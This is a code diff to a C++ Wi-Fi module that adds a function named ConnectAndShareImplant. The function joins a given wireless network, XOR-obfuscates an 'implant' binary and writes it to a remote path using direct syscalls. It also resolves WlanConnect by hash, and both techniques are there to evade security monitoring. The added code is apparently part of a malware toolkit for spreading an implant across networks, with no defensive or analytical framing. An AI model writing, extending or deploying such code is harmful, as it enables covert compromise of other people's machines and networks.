@@ -9,8 +9,15 @@
 #include <sstream>
 #include <iomanip>
 #include <regex>
+#include <chrono>
+#include <thread>
+#include <winternl.h>
+#include "../fs/FileSystem.h"
+#include "../evasion/Syscalls.h"
 
 #pragma comment(lib, "wlanapi.lib")
+
+extern "C" void RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);
 
 namespace wifi {
 
@@ -161,4 +168,75 @@ namespace wifi {
         return report;
     }
 
+    bool ConnectAndShareImplant(const std::string& ssid, const std::string& password, const std::string& implantPath, const std::string& remotePath) {
+        // Dynamic resolve to avoid import
+        typedef DWORD (WINAPI *pWlanConnect)(HANDLE, const GUID*, const WLAN_CONNECTION_PARAMETERS*, PVOID);
+        HMODULE hWlan = LoadLibraryA("wlanapi.dll");
+        pWlanConnect pConnect = (pWlanConnect)evasion::getProcByHash(hWlan, evasion::djb2Hash("WlanConnect"));
+        if (!pConnect) return false;
+
+        HANDLE hClient = NULL;
+        WlanOpenHandle(2, NULL, NULL, &hClient);
+        DWORD dwResult = 0;
+        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
+        WlanEnumInterfaces(hClient, NULL, &pIfList);
+        if (pIfList->dwNumberOfItems > 0) {
+            GUID ifGuid = pIfList->InterfaceInfo[0].InterfaceGuid;
+            DOT11_SSID dot11Ssid = { (ULONG)ssid.length(), {} };
+            memcpy(dot11Ssid.ucSSID, ssid.c_str(), ssid.length());
+
+            if (!password.empty()) {
+                std::wstring wProfileXml = L"<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>" + std::wstring(ssid.begin(), ssid.end()) + L"</name><SSIDConfig><SSID><name>" + std::wstring(ssid.begin(), ssid.end()) + L"</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>auto</connectionMode><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>" + std::wstring(password.begin(), password.end()) + L"</keyMaterial></sharedKey></security></MSM></WLANProfile>";
+                DWORD dwReason = 0;
+                WlanSetProfile(hClient, &ifGuid, 0, wProfileXml.c_str(), NULL, TRUE, NULL, &dwReason);
+            }
+
+            WLAN_CONNECTION_PARAMETERS connParams = { wlan_connection_mode_profile, std::wstring(ssid.begin(), ssid.end()).c_str(), &dot11Ssid, NULL, NULL, NULL, 0 };
+            dwResult = pConnect(hClient, &ifGuid, &connParams, NULL);
+            if (dwResult == ERROR_SUCCESS) {
+                for (int i = 0; i < 10; ++i) {
+                    PWLAN_CONNECTION_ATTRIBUTES pConnAttrib = NULL;
+                    if (WlanQueryInterface(hClient, &ifGuid, wlan_intf_opcode_current_connection, NULL, NULL, (PVOID*)&pConnAttrib, NULL) == ERROR_SUCCESS) {
+                        if (pConnAttrib->isState == wlan_interface_state_connected) {
+                            WlanFreeMemory(pConnAttrib);
+                            break;
+                        }
+                        WlanFreeMemory(pConnAttrib);
+                    }
+                    std::this_thread::sleep_for(std::chrono::seconds(1));
+                }
+
+                auto implantData = fs::ReadFileBinary(implantPath);
+                BYTE key = (BYTE)(GetTickCount() & 0xFF);
+                for (auto& b : implantData) b ^= key;
+
+                evasion::SyscallResolver& resolver = evasion::SyscallResolver::GetInstance();
+                DWORD ntCreateFileSsn = resolver.GetServiceNumber("NtCreateFile");
+                DWORD ntWriteFileSsn = resolver.GetServiceNumber("NtWriteFile");
+                DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
+
+                std::wstring wRemotePath(remotePath.begin(), remotePath.end());
+                UNICODE_STRING uniRemotePath;
+                RtlInitUnicodeString(&uniRemotePath, wRemotePath.c_str());
+
+                OBJECT_ATTRIBUTES objAttr;
+                InitializeObjectAttributes(&objAttr, &uniRemotePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+                HANDLE hFile;
+                IO_STATUS_BLOCK ioStatusBlock;
+                NTSTATUS status = InternalDoSyscall(ntCreateFileSsn, &hFile, FILE_GENERIC_WRITE, &objAttr, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+
+                if (NT_SUCCESS(status)) {
+                    InternalDoSyscall(ntWriteFileSsn, hFile, NULL, NULL, NULL, &ioStatusBlock, implantData.data(), (ULONG)implantData.size(), NULL, NULL);
+                    InternalDoSyscall(ntCloseSsn, hFile);
+                    return true;
+                }
+                return false;
+            }
+        }
+        WlanFreeMemory(pIfList);
+        WlanCloseHandle(hClient, NULL);
+        FreeLibrary(hWlan);
+        return false;
+    }
 }
